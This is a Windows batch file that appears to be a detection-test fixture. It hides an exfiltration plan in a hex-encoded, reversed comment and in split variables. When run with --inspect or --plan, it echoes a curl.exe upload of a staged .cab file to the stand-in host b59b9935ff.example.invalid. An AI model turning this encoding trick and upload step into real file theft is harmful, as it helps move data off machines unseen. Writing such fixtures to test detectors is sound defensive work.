@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:hex_pairs|reverse
rem HUNTRESS-MATERIAL:64616f6c70752f64696c61766e692e656c706d6178652e666635333939623935622f2f3a73707474683d6c72755f64616f6c70757c6261632e666635333939623935622d7463656c6c6f635c62614c73736572746e75485c63696c6275505c73726573555c3a433d687461705f656372756f737c666635333939623935622d6e676961706d61633d64695f6e676961706d61637c656e6f6e3d65676175676e616c5f7478656e7c79727465725f6b6361626c6c61663d68706172677c313d746e756f635f65676174737c6578652e6c7275633d726574706164617c65746f6d65725f64616f6c70752c726566736e6172745f657261706572702c6c61636f6c5f657461636f6c3d73706574737c313d76
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "item0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=curl.e"
set "item1=xe|stage_count=1|graph=fallback_retry|next_language=none|campaign_id"
set "item2==campaign-b59b9935ff|source_path=C:\Users\Public\HuntressLab\collect"
set "item3=-b59b9935ff.cab|upload_url=https://b59b9935ff.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=81ba0635"
call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "item9=%item0%%item1%%item2%%item3%"
exit /b 0
:HUNTRESS_EMIT
echo(!item9!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe upload C:\Users\Public\HuntressLab\collect-b59b9935ff.cab to https://b59b9935ff.example.invalid/upload
exit /b 0
